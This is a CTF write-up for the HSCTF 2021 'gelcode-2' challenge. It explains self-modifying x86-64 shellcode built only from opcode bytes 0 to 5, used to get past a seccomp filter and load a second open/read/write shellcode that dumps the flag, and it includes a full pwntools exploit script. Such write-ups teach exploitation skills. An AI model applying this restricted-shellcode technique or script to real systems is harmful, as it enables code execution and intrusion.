I did the gelcode challenge in HSCTF 2021 in solo, but did not finish it before CTF's end... 

this one was based on first gelcode, but even more restricted, you can only use opcodes values from 0 to 5..

there was also a seccomp in place

[![https://imgur.com/6hYpm4F.png](https://imgur.com/6hYpm4F.png)](https://imgur.com/6hYpm4F.png)

which only allows open, read, write syscalls

as often for this kind challenge, the solution, is escape as soon as you can from this hell..

with a read syscall, to read a unrestricted shellcode..

for this we need at minimum, to have:
* eax = 0
* rsi pointing to a RWX buffer
* rdi = 0
* and rdx containing an enough big value (at least as big as our shellcode, but can be bigger)

to complicate things, all the registers are set to 0x1337133713371337 before calling our shellcode, even rsp,

so we can not use stack.

the solution, in our case is self modifying code,

we are going to generate the opcodes we need, to bypass the restrictions in place.

we will use mainly:

```add eax,dword value   # opcode 05 val val val val```

to modify eax, (as we are in 64bit , the upper 32bits of rax will be cleared by using 32 bit arithmetic instructions)

```add al,byte value   # opcode 04 val```

to modify al only

```add dword[rip+0],eax   # opcode 01 05 00 00 00 00```

to modify next instruction (rip+0) by adding eax to values in place, with this one we can create instructions with any opcodes we want

```add byte[rip+0],al   # opcode 00 05 00 00 00 00```

to modify next instruction (rip+0) by adding al to value in place, with this one also we can create instructions with any opcodes we want

that's all we need !!!

first we create an opcode lea rsi,[rip] to make rsi points to ourself

then mov edx, 0x400

mov edi,0

then xor eax,eax / syscall to call the read syscall reading data on ourselves,

and replace the actual restricted shellcode by a second one, unrestricted,

where we can do an open/read/write shellcode to dump the flag...

I got first blood on this one (yes a bit proud :) )

with our team "Sentry Up Before You Nops Nops" --> french super team...cream of the cream...


```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF('./gelcode-2')
host, port = "mc.ax", "31034"

# from a src eax, calculate increment of each byte to read dest eax, and emit correct opcodes for it
def equalize(src, dst):
  ret = ''
  ov0 = 0
  ov1 = 0
  ov2 = 0
  d0 = dst & 0xff
  d1 = (dst>>8)&0xff
  d2 = (dst>>16)&0xff
  d3 = (dst>>24)&0xff
  s0 = src & 0xff
  s1 = (src>>8)&0xff
  s2 = (src>>16)&0xff
  s3 = (src>>24)&0xff
  if (d0<s0):
    d0 += 0x100
    ov0 = 1
    s1 += 1
  if (d1<s1):
    d1 += 0x100
    ov1 = 1
    s2 += 1
  if (d2<s2):
    d2 += 0x100
    ov2 = 1
    s3 += 1
  if (d3<s3):
    d3 += 0x100

  while True:
    if ((s0 == d0) and (s1 == d1) and (s2 == d2) and (s3 == d3)):
      break
    if ((d0 - s0) > 5):
      o0 = 5
    else:
      o0 = d0 - s0
    if ((d1 - s1) > 5):
      o1 = 5
    else:
      o1 = d1 - s1
    if ((d2 - s2) > 5):
      o2 = 5
    else:
      o2 = d2 - s2
    if ((d3 - s3) > 5):
      o3 = 5
    else:
      o3 = d3 - s3
    s0 += o0
    s1 += o1
    s2 += o2
    s3 += o3
    ret += 'add eax,0x0'+str(o3)+'0'+str(o2)+'0'+str(o1)+'0'+str(o0)+'\n'
  return ret

# create lea rsi,[rip] opcode
sc = equalize(0x13371337,0x3088438b)
sc += 'add [rip+0],eax\n'
sc += '.byte 5,5,5,5,0,0,0,0\n'
sc += 'add al,5\n'*8
sc += 'add al,2\n'
#create mov edx, 0x400    opcode
sc += 'add [rip+0x0],al\n'
sc += '.byte 5,0,4,0,0\n'
sc += 'add al,5\n'
# create mov edi,0   opcode
sc += 'add [rip+0],al\n'
sc += '.byte 5,0,0,0,0\n'
# create xor eax,eax / syscall opcodes
sc += equalize(0x308843ba, 0xabb2c)
sc += 'add [rip+0],eax\n'
sc += '.byte 5,5,5,5\n'

shellcode = asm(sc)
print('shellcode length: '+str(len(shellcode)))

length = len(shellcode)


p = remote(host,port)
p.recvuntil('is ', drop=True)
length = 362

payload = bytearray(shellcode.ljust(length,b'\x00'))

# second shellcode, read from the first one,  simple open('flag.txt') , read(), write it to stdout   (if program does not ouput to stdout try other fds 0,1,2,3,4,5,etc..)
shellcode2 = asm('''
  mov rdi,rsi
  mov rbp,rdi
  mov rsi,0
  mov rdx,0
  mov eax,2
  syscall
  mov rdi,rax
  mov rsi,rbp
  mov rdx,0x200
  mov eax,0
  syscall
next:
  mov rdx,rax
  mov rdi,1
  mov rsi,rbp
  mov eax,1
  syscall

  mov eax,60
  syscall
''')

p.sendafter('input:\n', payload)

# the flag filename is here,  normally it's in current directory on remote machine
payload = b'flag.txt\x00'
payload = payload.ljust(0x150,b'\x90')
payload += shellcode2

p.send(payload)

p.interactive()

```

